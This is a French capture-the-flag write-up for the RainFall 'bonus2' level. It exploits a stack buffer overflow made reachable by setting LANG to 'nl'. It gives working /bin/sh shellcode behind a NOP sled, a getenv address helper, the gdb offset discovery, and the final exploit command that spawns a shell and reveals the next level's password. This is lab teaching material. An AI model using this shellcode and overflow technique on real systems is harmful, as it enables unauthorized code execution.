# Bonus2

## 0 - Test de l'éxécutable

```shell
bonus2@RainFall:~$ ./bonus2
bonus2@RainFall:~$ ./bonus2 bonjour
bonus2@RainFall:~$ 
bonus2@RainFall:~$ ./bonus2 bonjour cava
Hello bonjour
```

## 1 - Analyse du code source

En utilisant dogbolt, nous pouvons analyser le binaire pour comprendre son fonctionnement. Nous devons à nouveau exploiter `strcat()` afin de déclencher un shellcode. Ce programme utilise la variable d'environnement `LANG` pour nous saluer dans la langue correspondante si on lui donne deux arguments. Les valeurs `fi` et `nl` sont reconnues, l'anglais étant la langue par défaut. Il faut utiliser soit `fi` soit `nl` pour provoquer un dépassement de tampon car le message d'accueil en anglais est trop court. En utilisant `nl`, on trouve que l'offset nécessaire est de **23** octets.

Il suffit de définir la variable d'environnement `LANG` sur `nl` et d'exporter un shellcode dans notre environnement...

## 2 - Mise en place du shellcode et de la variable LANG

shellcode source : https://0xrick.github.io/binary-exploitation/bof5/

```shell
$> export LANG="nl"
$> export SHELLCODE=`python -c 'print("\x90" * 1000 + "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80")'`
```

**Explication :**
- `\x90` = instruction NOP (No Operation) : elle ne fait rien, juste passer à l'instruction suivante
- On met **1000 NOP** avant le shellcode réel
- **Pourquoi ?** Si l'adresse mémoire change légèrement, on a plus de chances de "tomber" dans notre zone de NOP, qui nous mènera jusqu'au shellcode réel.
- `"\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"` : cette suite d'octet ferme stdin, ouvre /dev/tty pour rattacher le programme au terminal, puis exécute /bin/sh afin d’obtenir un shell interactif.

## 3 - Récupération de l'adresse du shellcode

```C
#include <stdio.h>
#include <stdlib.h>

int main(int argc, char** argv)
{
  printf("env address at %p\n", getenv(argv[1]));
  return (0);
}
```

**Exemple d'utilisation :**
```shell
$> gcc getenv.c -o getenv
$> ./getenv SHELLCODE
env address at 0xbffffXXX
```

## 4 - Récupération de l'offset

Ici encore, on envoie le pattern généré par cyclic() en argument du programme :

```shell
bonus2@RainFall:~$ export LANG="nl"
bonus2@RainFall:~$ gdb ./bonus2
bonus2@RainFall:~$ ./bonus2 bonjour cava
Goedemiddag! bonjour

bonus2@RainFall:~$ gdb ./bonus2
[...]
(gdb) run aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
Starting program: /home/user/bonus2/bonus2 aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
Goedemiddag! aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaaaaaabaaacaaadaaaeaaafaaagaaahaaa

Program received signal SIGSEGV, Segmentation fault.
0x61616761 in ?? ()
```

Puis on récupère l'offset en passant l'endroit de la segfault en argument de cyclic_find() :

```shell
(cons310_i2) ➜  rainfall git:(main) ✗ python -c "from pwn import *; print(cyclic_find(0x61616761))"
23
```

-> L'offset est de 23 bytes


## 5 - Mise en place de l'exploit

Pour le premier argument, on met 40 caractères pour bien remplir le premier strncpy()

```C
char dest[76];

memset(dest, 0, sizeof(dest));
strncpy(dest,      argv[1], 0x28);  // 40 octets
strncpy(dest + 40, argv[2], 0x20);  // 32 octets
```

```shell
  $> ./bonus2 $(python -c "print '\x90' * 40") $(python -c "print '\x90' * 23 + '\xXX\xXX\xXX\xXX'[::-1]")
Goedemiddag! �������������������������������������������������������������������
  $ cat /home/user/bonus3/.pass
  71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
```

## 6 - Log terminal entier

```shell
# Mise en place des variables d'environnement
bonus2@RainFall:~$ export LANG="nl"
bonus2@RainFall:~$ export SHELLCODE=`python -c 'print("\x90" * 1000 + "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80")'`

# Récupération de l'adresse de shellcode
bonus2@RainFall:~$ cd /tmp/
bonus2@RainFall:/tmp$ touch getenv.c
bonus2@RainFall:/tmp$ nano getenv.c 
bonus2@RainFall:/tmp$ cc getenv.c 
bonus2@RainFall:/tmp$ ./a.out SHELLCODE
env address at 0xbffff51d

# Exploit final
bonus2@RainFall:/tmp$ cd ~
bonus2@RainFall:~$ ./bonus2 $(python -c "print '\x90' * 40") $(python -c "print '\x90' * 23 + '\xbf\xff\xf5\x1d'[::-1]")
Goedemiddag! ??????????????????????????????????????????????????????????????????
$ cat /home/user/bonus3/.pass
71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
```